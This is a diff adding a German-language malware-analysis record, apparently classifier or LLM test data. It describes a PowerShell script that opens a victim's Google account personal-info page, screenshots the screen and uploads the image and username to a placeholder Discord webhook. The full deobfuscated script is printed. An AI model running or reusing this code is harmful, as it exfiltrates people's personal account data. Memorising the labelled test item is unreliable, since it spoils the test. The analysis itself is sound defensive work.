@@ -1,0 +1,109 @@
+{
+  "meta": {
+    "quelldatei": "tech_022_Get-EmailInfo.ps1",
+    "sha256": "bf533c7f1ddb15700db34140abe4e90ca1b867e32183aa27b9d181e2ef4246ac",
+    "groesse_bytes": 1483,
+    "zeilen": 48,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "https://myaccount.google.com/personal-info?hl=en",
+      "{DOWN 8}",
+      "CaliShot.png",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR DISCORD WEBHOOK HERE"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "https://myaccount.google.com/personal-info?hl=en",
+      "{DOWN 8}",
+      "CaliShot.png",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR DISCORD WEBHOOK HERE"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-EmailInfo",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Out-Null",
+      "Remove-Item",
+      "Start-Process",
+      "Start-Sleep",
+      "Upload-Discord"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1,
+      "start_process": 1,
+      "add_type": 2
+    },
+    "iocs": {
+      "urls": [
+        "https://myaccount.google.com/personal-info?hl=en"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:username"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "https://myaccount.google.com/personal-info?hl=en",
+      "{DOWN 8}",
+      "CaliShot.png",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR DISCORD WEBHOOK HERE"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-EmailInfo",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Out-Null",
+      "Remove-Item",
+      "Start-Process",
+      "Start-Sleep",
+      "Upload-Discord"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1,
+      "start_process": 1,
+      "add_type": 2
+    },
+    "iocs": {
+      "urls": [
+        "https://myaccount.google.com/personal-info?hl=en"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:username"
+      ]
+    },
+    "deobfuskiert_auszug": "function Get-EmailInfo {\n    param (\n        [string]$targetURL = \"https://myaccount.google.com/personal-info?hl=en\"\n    )\n\n    Start-Process $targetURL\n\n    Start-Sleep -Seconds 2\n    \n    [System.Windows.Forms.SendKeys]::SendWait(\"{DOWN 8}\")\n\n    $fileName = \"CaliShot.png\"\n    $screenshotPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName)\n\n    Add-Type -AssemblyName System.Windows.Forms\n    Add-Type -AssemblyName System.Drawing\n\n    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n    $screenshot = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height\n    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)\n    $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)\n\n    $screenshot.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)\n\n    return $screenshotPath\n}\n\nfunction Upload-Discord {\n    param (\n        [string]$file,\n        [string]$text,\n        [string]$webhookUrl\n    )\n\n    if ($text) {\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\n    }\n    elseif ($file) {\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\n    }\n}\n\n#$filePath = Get-EmailInfo\n#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file $filePath | Out-Null\n\n# Delete the screenshot file after uploading\n#Remove-Item -Path $filePath -Force\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Prozess starten",
+      "WebClient erstellen"
+    ]
+  }
+}
